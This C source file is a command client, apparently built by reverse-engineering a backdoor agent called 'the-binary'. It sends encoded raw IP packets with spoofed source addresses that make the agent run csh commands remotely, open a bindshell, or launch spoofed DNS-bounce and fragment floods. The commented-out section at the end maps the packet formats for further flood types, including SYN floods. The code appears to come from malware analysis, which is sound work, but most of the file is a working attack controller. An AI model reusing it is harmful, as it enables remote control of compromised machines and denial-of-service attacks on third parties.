#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sys/types.h>
#include <libnet.h>
#include <pcap.h>

#define CMD_01_STATUS 1
#define CMD_02_CONFIG 2
#define CMD_03_EXEC 3
#define CMD_04_DNSFLOOD1 4
#define CMD_05_FRAGFLOOD 5
#define CMD_06_BINDSHELL 6
#define CMD_07_EXECSILENT 7
#define CMD_08_STOP  8
#define CMD_09_DNSFLOOD2 9


#define CMD_12_DNSFLOOD3 12

struct config {
	int cmd;         // Command number
	int getresponse; // Do we expect a response?
	int bindshell;   // Are we going to connect to a bindshell?
	int protocol;    // This is the protocol number, as seen in netstat -an
	int bodylen;     // Length to pad packet to
	int respwait;    // ms to wait for a response
	char *device;    // Name of network device
	int ttl;         // TTL for command packet
	u_long saddr;    // Spoofed source address
	u_long daddr;    // Destination address

	unsigned char unknownbyte; // There are a couple of bytes I'm not sure of yet...

	// The following data is specific to particular commands

	// CMD 02: Configure
	int ipcount;       // Number of addresses in iplist
	u_long iplist[16]; // IP addresses

	// CMD 03 and 07: Exec
	char *cmdline;

	// CMD 04, 05, 09, 12: DNS Flood 1, 2, 3
	unsigned int targetport;
	u_long targetip;
	char *targethostname;

	// CMD 09, 05: DNS Flood 3, Frag Flood
	u_long spoofsourceip;

	// CMD 05: Frag Flood
	unsigned char isudpflood;
};

extern int errno;

struct bpf_program pc_filter;

void encode(unsigned char *buff, unsigned int length)
{
	unsigned int pos;

	buff[0] += 0x17;

	for(pos=1;pos<length;pos++)
		buff[pos] += buff[pos-1] + 0x17;
}

void decode(unsigned char *data, unsigned int length)
{
	unsigned int pos;

	for(pos=length;pos>0;pos--)
		data[pos] -= data[pos-1] + 0x17;

	data[0] -= 0x17;
}

void show_usage()
{
	fprintf(stderr, "the-client <args> <cmd>\n");
	fprintf(stderr, "\n");
	fprintf(stderr, "args:\n");
	fprintf(stderr, "        -s <host>            Client source address to spoof\n");
	fprintf(stderr, "        -d <host>            Network address of the-binary\n");
	fprintf(stderr, "        -i <device>          Network device to use             (eth0)\n");
	fprintf(stderr, "        -l <length>          Command packet body length        (0x190)\n");
	fprintf(stderr, "        -p <protocol>        Command protocol number           (11)\n");
	fprintf(stderr, "        -w <time>            Number of ms to wait for response (500)\n");
	fprintf(stderr, "        -u <byte>            Value for unknown byte            (0)\n");
	fprintf(stderr, "\n");
	fprintf(stderr, "cmd:    status               Get status of the-binary\n");
	fprintf(stderr, "        config <IP> <IP>...  Configure the-binary with a list of clients\n");
	fprintf(stderr, "                             Unknown is used for a flag?\n");
	fprintf(stderr, "        bindshell            Start bindshell on the-binary host\n");
	fprintf(stderr, "        stop                 Stop any shells or DOS floods on the-binary host\n");
	fprintf(stderr, "        exec <cmd>           Execute <cmd> under csh and return output\n");
	fprintf(stderr, "        exec_silent <cmd>    Execute <cmd> under csh and discard output\n");
	fprintf(stderr, "        flood <type> <args>  Start a DOS flood\n");
	fprintf(stderr, "\n");
	fprintf(stderr, "floods: dns1 <target> <port> DNS Bounce flood 1.\n");
	fprintf(stderr, "        dns2 <target> <port> DNS Bounce flood 2.\n");
	fprintf(stderr, "                             Unknown is used for a flag?\n");
	fprintf(stderr, "        dns3 <target> <sourceport> <sourceip>\n");
	fprintf(stderr, "                             DNS Bounce flood 3.\n");
	fprintf(stderr, "                             Unknown is used for a flag?\n");
	fprintf(stderr, "        frag <target> <sourceport> <sourceip>\n");
	fprintf(stderr, "                             UDP/ICMP flood.  Is UDP if -u is 1.\n");
	fprintf(stderr, "\n");
	fprintf(stderr, "examples:\n");
	fprintf(stderr, "the-client -i tap0 -s 192.168.32.1 -d 192.168.32.200 config 192.168.32.254\n");
	fprintf(stderr, "the-client -i tap0 -s 192.168.32.1 -d 192.168.32.255 status\n");
	fprintf(stderr, "the-client -i tap0 -s 192.168.32.1 -d 192.168.32.255 exec \"ls -al\"\n");
	fprintf(stderr, "the-client -i tap0 -s 192.168.32.1 -d 192.168.32.255 flood dns1 www.example.com 53\n");
}

int process_cmdline(int argc, char *argv[], struct config *cnf)
{
	int option;
	extern int optind;
	extern char *optarg;
	int i;

	bzero(cnf, sizeof(struct config));
	cnf->protocol = 11;
	cnf->bodylen = 0x190;
	cnf->respwait = 500;
	cnf->ttl = 0xfa;
	cnf->cmdline = strdup("ls");
	cnf->targethostname = strdup("localhost");
	cnf->targetport = 53;

	while((option = getopt(argc, argv, "s:d:i:l:p:w:u:")) > 0)
	{
		switch(option)
		{
		case 's':	cnf->saddr = libnet_name_resolve(optarg, 1);
				break;
		case 'd':	cnf->daddr = libnet_name_resolve(optarg, 1);
				break;
		case 'i':	cnf->device = strdup(optarg);
				break;
		case 'l':	cnf->bodylen = atoi(optarg);
				break;
		case 'p':	cnf->protocol = atoi(optarg);
				break;
		case 'w':	cnf->respwait = atoi(optarg);
				break;
		case 'u':	cnf->unknownbyte = (unsigned char)atoi(optarg);
				break;
		default:	show_usage();
				return(-1);
		}
	}

	if(cnf->device == NULL)
		cnf->device = strdup("eth0");

	option = -1;
	if(optind > 0 && optind < argc)
	{
		if(! strcasecmp(argv[optind], "status"))
		{
			cnf->cmd = option = CMD_01_STATUS;
			cnf->getresponse = 1;
		}
		if(! strcasecmp(argv[optind], "config"))
		{
			cnf->cmd = option = CMD_02_CONFIG;

			// Read space seperated list of IP addresses from command line
			for(i=1;optind+i < argc;i++)
			{
				cnf->iplist[i-1] = libnet_name_resolve(argv[optind+i], 1);
			}
			cnf->ipcount = i - 1;
		}
		if(! strcasecmp(argv[optind], "exec"))
		{
			cnf->getresponse = 1;
			cnf->cmd = option = CMD_03_EXEC;
			if(optind+1 < argc)
				cnf->cmdline = strdup(argv[optind+1]);
		}
		if(! strcasecmp(argv[optind], "bindshell"))
		{
			cnf->cmd = option = CMD_06_BINDSHELL;
			cnf->bindshell = 1;
		}
		if(! strcasecmp(argv[optind], "exec_silent"))
		{
			cnf->cmd = option = CMD_07_EXECSILENT;
			if(optind+1 < argc)
				cnf->cmdline = strdup(argv[optind+1]);
		}
		if(! strcasecmp(argv[optind], "stop"))
		{
			cnf->cmd = option = CMD_08_STOP;
		}
		if(! strcasecmp(argv[optind], "flood"))
		{
			// Require at least flood type and target
			if (optind + 2 >= argc)
			{
				show_usage();
				return(-1);
			}

			if(! strcasecmp(argv[optind+1], "dns1"))
			{
				cnf->cmd = option = CMD_04_DNSFLOOD1;
			}
			if(! strcasecmp(argv[optind+1], "frag"))
			{
				cnf->cmd = option = CMD_05_FRAGFLOOD;
			}
			if(! strcasecmp(argv[optind+1], "dns2"))
			{
				cnf->cmd = option = CMD_09_DNSFLOOD2;
			}
			if(! strcasecmp(argv[optind+1], "dns3"))
			{
				cnf->cmd = option = CMD_12_DNSFLOOD3;
			}

			// Assume hostname is IP address if begins with digit
			if(isdigit(*argv[optind+2]))
				cnf->targetip = libnet_name_resolve(argv[optind+2], 1);
			else
				cnf->targethostname = strdup(argv[optind+2]);

			// Get optional target port
			if (optind + 3 < argc)
				cnf->targetport = atoi(argv[optind+3]);

			// Get spoofed source address
			if (((option == CMD_12_DNSFLOOD3) || (option == CMD_05_FRAGFLOOD)) && (optind + 4 < argc))
				cnf->spoofsourceip = libnet_name_resolve(argv[optind+4], 1);
		}
	}

	return(option);
}

pcap_t *open_libpcap(struct config *cnf)
{
	char errbuff[PCAP_ERRBUF_SIZE];
	bpf_u_int32 mynetwork;
	bpf_u_int32 mynetmask;
	char filter[20];
	pcap_t *pc;

	sprintf(filter, "ip proto %d", cnf->protocol);

	pc = pcap_open_live(cnf->device, 1500, 0, cnf->respwait, errbuff);
	if(pc == NULL)
	{
		fprintf(stderr, "Failed to open %s: %s\n", cnf->device, errbuff);
		return(NULL);
	}
	if((pcap_lookupnet(cnf->device, &mynetwork, &mynetmask, errbuff) == -1) ||
	   (pcap_compile(pc, &pc_filter, filter, 1, mynetmask) == -1) ||
	   (pcap_setfilter(pc, &pc_filter) == -1))
	{
		fprintf(stderr, "Failed to configure interface %s: %s\n",
			cnf->device, pcap_geterr(pc));
		return(NULL);
	}
	return(pc);
}

void construct_config(struct config *cnf, unsigned char *data)
{
	int i;

	// XXX, 2 = use list?
	data[0] = cnf->unknownbyte;

	// Copy client address list into packet body
	for(i=0;i<cnf->ipcount;i++)
	{
		*(u_long *)(&data[(i*4) + 1]) = cnf->iplist[i];
	}
}

void construct_exec(struct config *cnf, unsigned char *data)
{
	strcpy(data, cnf->cmdline);
}

void construct_dnsflood(struct config *cnf, unsigned char *data)
{
	int i=4;

	*(u_long *)(&data[0]) = cnf->targetip;

	if(cnf->cmd == CMD_12_DNSFLOOD3)
	{
		*(u_long *)(&data[i]) = cnf->spoofsourceip;
		i += 4;
	}

	if((cnf->cmd == CMD_09_DNSFLOOD2) ||
	   (cnf->cmd == CMD_12_DNSFLOOD3))
		data[i++] = cnf->unknownbyte;

	data[i++] = (cnf->targetport >> 8) & 0xFF;
	data[i++] = (cnf->targetport) & 0xFF;

	// Use IP or hostname as target address?
	if(cnf->targetip != 0)
		data[i++] = 0;
	else
	{
		data[i++] = 1;
		strcpy(&data[i++], cnf->targethostname);
	}
}

void construct_fragflood(struct config *cnf, unsigned char *data)
{
	// ICMP(0) or UDP(1)
	data[0] = cnf->unknownbyte;

	if(cnf->unknownbyte)
	{
		// We get to speficy a UDP port in range 0-255
		data[1] = (cnf->targetport) & 0xFF;
	}else{
		// Might as well add some salt (ignored)
		data[1] = rand() & 0xFF;
	}

	*(u_long *)(&data[2]) = cnf->targetip;
	*(u_long *)(&data[6]) = cnf->spoofsourceip;

	// Use IP or hostname as target address?
	if(cnf->targetip != 0)
		data[10] = 0;
	else
	{
		data[10] = 1;
		strcpy(&data[8], cnf->targethostname);
	}
}

int send_command(struct config *cnf)
{
	int sock;
	unsigned char *sendpacket, *body, *protodata;

	int i;
	printf("Cmd: %d\tResp?: %d\tBind?: %d\tProto: %d\n",
		cnf->cmd, cnf->getresponse, cnf->bindshell, cnf->protocol);
	printf("Body: %d\tWait: %d\tDevice: %s\tttl: %d\tUnk: %d\n",
		cnf->bodylen, cnf->respwait, cnf->device, cnf->ttl, cnf->unknownbyte);
	printf("Source: %d.%d.%d.%d\tDest: %d.%d.%d.%d\n",
		((cnf->saddr) & 0xFF),
		((cnf->saddr >> 8) & 0xFF),
		((cnf->saddr >> 16) & 0xFF),
		((cnf->saddr >> 24) & 0xFF),
		((cnf->daddr) & 0xFF),
		((cnf->daddr >> 8) & 0xFF),
		((cnf->daddr >> 16) & 0xFF),
		((cnf->daddr >> 24) & 0xFF));
	for(i=0;i<cnf->ipcount;i++)
	{
		printf("IP %d: %d.%d.%d.%d\n", i,
			((cnf->iplist[i]) & 0xFF),
			((cnf->iplist[i] >> 8) & 0xFF),
			((cnf->iplist[i] >> 16) & 0xFF),
			((cnf->iplist[i] >> 24) & 0xFF));
	}

	body = (unsigned char *)malloc(cnf->bodylen + 5);
	if(body == NULL)
	{
		fprintf(stderr, "malloc error allocating packet body (%d bytes)\n", cnf->bodylen + 3);
		return(-1);
	}
	protodata = &body[4];

	bzero(body, cnf->bodylen + 4);

	// Initialise packet data (direction flag, encoding salt, command byte)
	body[0] = 2; // Packet direction, 2 = request, 3 = reply
	body[1] = 0;

	body[2] = rand() & 0xFF;   // salt for encoding
	body[3] = cnf->cmd & 0xFF; // command

	switch(cnf->cmd)
	{
	case CMD_01_STATUS:	break; // No parameters
	case CMD_02_CONFIG:	construct_config(cnf, protodata);
				break;
	case CMD_03_EXEC:	construct_exec(cnf, protodata);
				break;
	case CMD_04_DNSFLOOD1:	construct_dnsflood(cnf, protodata);
				break;
	case CMD_05_FRAGFLOOD:	construct_fragflood(cnf, protodata);
				break;
	case CMD_06_BINDSHELL:	break; // No parameters
	case CMD_07_EXECSILENT:	construct_exec(cnf, protodata);
				break;
	case CMD_08_STOP:	break; // No parameters
	case CMD_09_DNSFLOOD2:	construct_dnsflood(cnf, protodata);
				break;
	case CMD_12_DNSFLOOD3:	construct_dnsflood(cnf, protodata);
				break;
	default:		fprintf(stderr, "How do I construct the packet for cmd %d?\n", cnf->cmd);
				return(-1);
	}

	encode(&body[2], cnf->bodylen);

	sock = libnet_open_raw_sock(cnf->protocol);
	if(sock > 0)
	{
		libnet_init_packet(1000, &sendpacket);

		libnet_build_ip(
			cnf->bodylen+2, 
			0,      // TOS
			rand(), // ID
			0,      // Frag
			cnf->ttl,       // TTL
			cnf->protocol,  // Protocol
			cnf->saddr,	// Source Address
			cnf->daddr,	// Destination Address
			body, cnf->bodylen+2, sendpacket);

		libnet_write_ip(sock, sendpacket, cnf->bodylen+2);

		libnet_destroy_packet(&sendpacket);

		libnet_close_raw_sock(sock);
	}
	else
	{
		fprintf(stderr, "Failed to open raw socket\n");
		return(-1);
	}
	return(0);
}

#define MAXPACKET 1600

void dump_packet(u_char *arg, const struct pcap_pkthdr *hdr, const u_char *data)
{
	bpf_u_int32 pos;
	bpf_u_int32 packetlen, dir, cmd;
	bpf_u_int32 srcip, dstip, proto, ttl;
	u_char dirstring[20];
	u_char cmdstring[20];

	u_char unencrypted_data[MAXPACKET];
	unsigned int unencrypted_data_len = 0;

	if((hdr->len - 0x24) > 0)
	{
		unencrypted_data_len = hdr->len - 0x24;
		memcpy(unencrypted_data, &data[0x24], unencrypted_data_len);
		decode(unencrypted_data, unencrypted_data_len);
	}

	packetlen = (data[0x10] << 8) + data[0x11];
	srcip     = (data[0x1a] << 24) + (data[0x1b] << 16) + (data[0x1c] << 8) + (data[0x1d]);
	dstip     = (data[0x1e] << 24) + (data[0x1f] << 16) + (data[0x20] << 8) + (data[0x21]);

	ttl       = data[0x16];
	proto     = data[0x17];

	dir       = (data[0x23] << 8) + data[0x22];

	cmd       = (unencrypted_data[0x00] << 8) + unencrypted_data[0x01];

	switch(cmd & 0xFF)
	{
	case 1: strcpy(cmdstring, "status"); break;
	case 2: strcpy(cmdstring, "configure"); break;
	case 3: strcpy(cmdstring, "exec"); break;
	case 4: strcpy(cmdstring, "dns_flood"); break;
	case 7: strcpy(cmdstring, "exec_silent"); break;
	case 8: strcpy(cmdstring, "kill_child"); break;
	default: strcpy(cmdstring, "unknown");
	}

	switch(dir & 0xFF)
	{
	case 2: strcpy(dirstring, "request"); break;
	case 3: strcpy(dirstring, "reply"); break;
	default: strcpy(dirstring, "unknown");
	}

	printf("%d.%d.%d.%d -> %d.%d.%d.%d proto %02x ttl %d\n    ",
		(srcip >> 24) & 0xFF,
		(srcip >> 16) & 0xFF,
		(srcip >>  8) & 0xFF,
		(srcip      ) & 0xFF,
		(dstip >> 24) & 0xFF,
		(dstip >> 16) & 0xFF,
		(dstip >>  8) & 0xFF,
		(dstip      ) & 0xFF,
		proto, ttl);

	if((proto == 11) && unencrypted_data_len)
	{
 		printf("%04x (%s) %04x (%s)  %d data bytes:\n    ", dir, dirstring, cmd, cmdstring, unencrypted_data_len);
		pos=0x0;
		while(pos < unencrypted_data_len)
		{
			printf("%02X ", unencrypted_data[pos]);
			if((pos%16) == 15)
			{
				pos -= 15;
				while((pos%16) != 15)
				{
					printf("%c", isprint(unencrypted_data[pos])?unencrypted_data[pos]:'.');
					pos++;
				}
				printf("%c", isprint(unencrypted_data[pos])?unencrypted_data[pos]:'.');
				printf("\n    ");
			}
			pos++;
		}
		printf("\n");
		printf("\n");
	}
}

int main(int argc, char *argv[])
{
	struct config cnf;
	pcap_t *pc;

	srand(time(NULL));

	if(geteuid())
	{
		fprintf(stderr, "the-client must be run as root, to construct raw packets\n");
		return(-1);
	}

	// Process command line
	if((process_cmdline(argc, argv, &cnf)) < 0)
		return(-1);

	// Open listener to receive response packets if we expect a response
	if(cnf.getresponse)
	{
		if((pc = open_libpcap(&cnf)) == NULL)
			return(-1);
	}

	// Construct and send command packet 
	if(send_command(&cnf) < 0)
		return(-1);

	// Receive and display response from the-binary, if expecting one
	if(cnf.getresponse)
	{
		pcap_dispatch(pc, -1, dump_packet, NULL);
	}

	// Connect to bindshell, if one has been spawned
	if(cnf.bindshell)
	{
		fprintf(stderr, "STUB: no bindshell support yet\n");
	}

	// Close packet reception
	if(cnf.getresponse)
	{
		pcap_close(pc);
		pcap_freecode(&pc_filter);
	}

	return(0);
}



//	if(i == 1)
//	{
//		// Command 1: status
//		// No arguments
//		// Response: ?? 01 07 00/01 XX XX
//		//   ?? = *0x807E77C
//		//   01 = CMD
//		//   07 = ?
//		//   00 = child flag, 1 = child is currently running
//		//   XXXX = number of command that spawned a child
//	}
//
//	if(i == 2)
//	{
//		// Command 2: configuration of up to 10 response IP addresses for cmd 1,3
//		// XXX
//		// -8 = Source IP is read from IP header
//		// +4   = type of address, 2 = single, other = list of 10
//		payload[4] = 2;
//		// +5-8 = dest IP 1
//		payload[5] = 192;
//		payload[6] = 168;
//		payload[7] = 32;
//		payload[8] = 254;
//		// more IPs can follow, if payload[4] is set correctly
//		bzero(&payload[9], PACKETLEN-9);
//
//		// No response
//	}
//
//	if(i == 3)
//	{
//		// Command 3: exec with output
//		// 2,3 are ignored.  4+ is command for /bin/csh
//		if(argc < 3)
//			strcpy(&payload[4], "touch /tmp/IRan.$$");
//		else
//			strcpy(&payload[4], argv[2]);
//	}
//
//	if(i == 4)
//	{
//		// DNS response/RST/ICMP_unreach flood target (IP or %1.virtual.org)
//
//		// Args are passed to L08049174
//		payload[0+4] = 192;  // L08049174 arg 1 forged source if flag == 0 line 1550
//		payload[1+4] = 168;  // L08049174 arg 2 forged source if flag == 0 line 1550
//		payload[2+4] = 32;   // L08049174 arg 3 forged source if flag == 0 line 1550
//		payload[3+4] = 128;  // L08049174 arg 4 forged source if flag == 0 line 1550
//		payload[4+4] = 2;    // L08049174 arg 5 forged source Port High line 1533
//		payload[5+4] = 154;  // L08049174 arg 6 forged source Port Low line 1533
//		payload[6+4] = 1;    // L08049174 arg 7 flag line 1490
//		                     //     0 = use above IP address as source address
//		                     //     1 = lookup below name as %1.virtual.org and use
//		                     //         IP as source address.
//		payload[7+4]  = 'w'; // L08049174 arg 8 raw data
//		payload[8+4]  = 'o'; // L08049174 arg 8 raw data
//		payload[9+4]  = 'r'; // L08049174 arg 8 raw data
//		payload[10+4] = 'd'; // L08049174 arg 8 raw data
//		payload[11+4] = 'u'; // L08049174 arg 8 raw data
//		payload[12+4] = 'p'; // L08049174 arg 8 raw data
//		payload[13+4] =  0;  // L08049174 arg 8 raw data
//	}
//
//	if(i == 5)
//	{
//		// Spoofed fragment packet flood
//		// ICMP or UDP (with dest port selection)
//
//04:44:45.306080 < 192.168.33.96 > 192.168.33.64: (frag 1109:9@65520) [tos 0x5c]  (ttl 224)
//                         455c 001d 0455 1ffe e011 f22f c0a8 2160
//                         c0a8 2140 00a9 00bd 0009 121a 61
//
//		payload[0+4] = 0;     // L080499F4 arg 1  // toggle 0,1
//		                      // 0 = ICMP flood,body 0800 9814 7374 7576 77
//		                      // 1 = UDP flood,body 00a9 00bd 0009 121a 61
//		payload[1+4] = 0xbd;  // L080499F4 arg 2  // 0x11 arg 1
//		payload[2+4] = 192;   // L080499F4 arg 3  // Dest Address
//		payload[3+4] = 168;   // L080499F4 arg 4
//		payload[4+4] = 33;    // L080499F4 arg 5
//		payload[5+4] = 64;    // L080499F4 arg 6
//		payload[6+4] = 192;   // L080499F4 arg 7  // forged Source Address
//		payload[7+4] = 168;   // L080499F4 arg 8
//		payload[8+4] = 33;    // L080499F4 arg 9
//		payload[9+4] = 96;    // L080499F4 arg 10
//		payload[10+4] = 1;    // L080499F4 arg 11  // toggle 0,1
//		                      //     0 = use above IP address as destination address
//		                      //     1 = lookup below name as %1.virtual.org and use
//		                      //         IP as destination address.
//		payload[11+4] = 'w';  // L080499F4 arg 12 raw data
//		payload[12+4] = 'o';  // L080499F4 arg 12 raw data
//		payload[13+4] = 'r';  // L080499F4 arg 12 raw data
//		payload[14+4] = 'd';  // L080499F4 arg 12 raw data
//		payload[15+4] = 'u';  // L080499F4 arg 12 raw data
//		payload[16+4] = 'p';  // L080499F4 arg 12 raw data
//		payload[17+4] =   0;  // L080499F4 arg 12 raw data
//	}
//
//	if(i == 6)
//	{
//		// Command 6: Open bindshell
//		// no args, no response
//	}
//
//	if(i == 7)
//	{
//		// Command 7: silent exec
//		// 2,3 are ignored.  4+ is command for /bin/csh
//		if(argc < 3)
//			strcpy(&payload[4], "touch /tmp/IRanSilently.$$");
//		else
//			strcpy(&payload[4], argv[2]);
//	}
//
//	if(i == 8)
//	{
//		// Command 8: Kill child PID
//		// No args, no result
//	}
//
//	if(i == 9)
//	{
//		// DNS response/RST/ICMP_unreach flood target (IP or %1.virtual.org)
//		// Has one more switch/counter argument than cmd 04 XXX
//
//		// Args are passed to L08049174
//		payload[0+4] = 192;  // L08049174 arg 1 forged source if flag == 0 line 1550
//		payload[1+4] = 168;  // L08049174 arg 2 forged source if flag == 0 line 1550
//		payload[2+4] = 32;   // L08049174 arg 3 forged source if flag == 0 line 1550
//		payload[3+4] = 128;  // L08049174 arg 4 forged source if flag == 0 line 1550
//		payload[4+4] = 2;    // counter 2->255 line 1592 XXX UNKNOWN
//		payload[5+4] = 2;    // L08049174 arg 6 forged source Port High line 1533
//		payload[6+4] = 154;  // L08049174 arg 5 forged source Port Low line 1533
//		payload[7+4] = 1;    // L08049174 arg 7 flag line 1490
//		                     //     0 = use above IP address as source address
//		                     //     1 = lookup below name as %1.virtual.org and use
//		                     //         IP as source address.
//		payload[8+4]  = 'w'; // L08049174 arg 8 raw data
//		payload[9+4]  = 'o'; // L08049174 arg 8 raw data
//		payload[10+4] = 'r'; // L08049174 arg 8 raw data
//		payload[11+4] = 'd'; // L08049174 arg 8 raw data
//		payload[12+4] = 'u'; // L08049174 arg 8 raw data
//		payload[13+4] = 'p'; // L08049174 arg 8 raw data
//		payload[14+4] =  0;  // L08049174 arg 8 raw data
//	}
//
//	if(i == 10)
//	{
//		// TCP SYN flood target on desired port
//		// random: source port, seq number, window, ttl, id
//
////05:58:14.527436 < 184.77.213.245.3944 > 192.168.32.128.666: S 16479582:16479582(0) win 1518 (ttl 238, id 3542)
////                         4500 0028 0dd6 0000 ee06 4f8e b84d d5f5
// //                        c0a8 2080 0f68 029a 00fb 755e 0000 0000
//  //                       5002 05ee b22d 0000
//
//		// Args are passed to L08049D40
//		payload[0+4] = 192;  // L08049D40 arg 1 dest address line 2217
//		payload[1+4] = 168;  // L08049D40 arg 2
//		payload[2+4] = 32;   // L08049D40 arg 3
//		payload[3+4] = 128;  // L08049D40 arg 4
//		payload[4+4] = 2;    // L08049D40 arg 5 dest port high
//		payload[5+4] = 154;  // L08049D40 arg 6 dest port low
//		payload[6+4] = 0;    // L08049D40 arg 7 flag line 2228
//		                     // 0 = use random source address
//		                     // 1 = use IP address from below as source
//		payload[7+4] = 192;  // L08049D40 arg 8 source address line 2229
//		payload[8+4] = 168;  // L08049D40 arg 9
//		payload[9+4] = 32;   // L08049D40 arg 10
//		payload[10+4] = 140; // L08049D40 arg 11
//		                     // arg 12 = 0
//		payload[11+4] = 1;   // L08049D40 arg 13 flag line 2231
//		                     //     0 = use above IP address as destination address
//		                     //     1 = lookup below name as %1.virtual.org and use
//		                     //         IP as destination address.
//		payload[12+4] = 'w'; // L08049D40 arg 14 raw data line 2232
//		payload[13+4] = 'o'; // L08049D40 arg 14 raw data
//		payload[14+4] = 'r'; // L08049D40 arg 14 raw data
//		payload[15+4] = 'd'; // L08049D40 arg 14 raw data
//		payload[16+4] = 'u'; // L08049D40 arg 14 raw data
//		payload[17+4] = 'p'; // L08049D40 arg 14 raw data
//		payload[18+4] =  0;  // L08049D40 arg 14 raw data
//	}
//
//	if(i == 11)
//	{
//		// TCP SYN flood target on desired port
//		// random: source port, seq number, window, ttl, id
//
////05:58:14.527436 < 184.77.213.245.3944 > 192.168.32.128.666: S 16479582:16479582(0) win 1518 (ttl 238, id 3542)
////                         4500 0028 0dd6 0000 ee06 4f8e b84d d5f5
// //                        c0a8 2080 0f68 029a 00fb 755e 0000 0000
//  //                       5002 05ee b22d 0000
//
//		// Args are passed to L08049D40
//		payload[0+4] = 192;  // L08049D40 arg 1 dest address line 2217
//		payload[1+4] = 168;  // L08049D40 arg 2
//		payload[2+4] = 32;   // L08049D40 arg 3
//		payload[3+4] = 128;  // L08049D40 arg 4
//		payload[4+4] = 2;    // L08049D40 arg 5 dest port high
//		payload[5+4] = 154;  // L08049D40 arg 6 dest port low
//		payload[6+4] = 0;    // L08049D40 arg 7 flag line 2228
//		                     // 0 = use random source address
//		                     // 1 = use IP address from below as source
//		payload[7+4] = 192;  // L08049D40 arg 8 source address line 2229
//		payload[8+4] = 168;  // L08049D40 arg 9
//		payload[9+4] = 32;   // L08049D40 arg 10
//		payload[10+4] = 140; // L08049D40 arg 11
//		payload[11+4] = 4;   // L08049D40 arg 12 counter, line 2200, 2371 XXX
//		payload[12+4] = 1;   // L08049D40 arg 13 flag line 2231
//		                     //     0 = use above IP address as destination address
//		                     //     1 = lookup below name as %1.virtual.org and use
//		                     //         IP as destination address.
//		payload[13+4] = 'w'; // L08049D40 arg 14 raw data line 2232
//		payload[14+4] = 'o'; // L08049D40 arg 14 raw data
//		payload[15+4] = 'r'; // L08049D40 arg 14 raw data
//		payload[16+4] = 'd'; // L08049D40 arg 14 raw data
//		payload[17+4] = 'u'; // L08049D40 arg 14 raw data
//		payload[18+4] = 'p'; // L08049D40 arg 14 raw data
//		payload[19+4] =  0;  // L08049D40 arg 14 raw data
//	}
//
//	if(i == 12)
//	{
//		// DNS bounce attack, queries SOA of com, org, net, edu, usc.edu from destination DNS
//		// sends some other DNS packets, unknown purpose?
//		// random: ttl, ID
//
//		// Args are passed to L08049564
//		payload[0+4] = 192;  // L08049564 arg 1 destination address line 1738
//		payload[1+4] = 168;  // L08049564 arg 2
//		payload[2+4] = 32;   // L08049564 arg 3
//		payload[3+4] = 128;  // L08049564 arg 4
//		payload[4+4] = 192;  // L08049564 arg 5 source address line 1802
//		payload[5+4] = 168;  // L08049564 arg 6
//		payload[6+4] = 32;   // L08049564 arg 7
//		payload[7+4] = 129;  // L08049564 arg 8
//		payload[8+4] = 0;    // L08049564 arg 9 count line 1740
//		payload[9+4] = 2;    // L08049564 arg 10 source port high
//		payload[10+4] = 154; // L08049564 arg 11 source port low
//		payload[11+4] = 1;   // L08049564 arg 12 hostname flag line 1752
//		                     // 0 = use above destination address
//		                     // 1 = resolve below name and use as destination address
//		payload[12+4] = 'w'; // L08049564 arg 13 raw data line 1753
//		payload[13+4] = 'o'; // L08049564 arg 13 raw data
//		payload[14+4] = 'r'; // L08049564 arg 13 raw data
//		payload[15+4] = 'd'; // L08049564 arg 13 raw data
//		payload[16+4] = 'u'; // L08049564 arg 13 raw data
//		payload[17+4] = 'p'; // L08049564 arg 13 raw data
//		payload[18+4] =  0;  // L08049564 arg 13 raw data
//	}

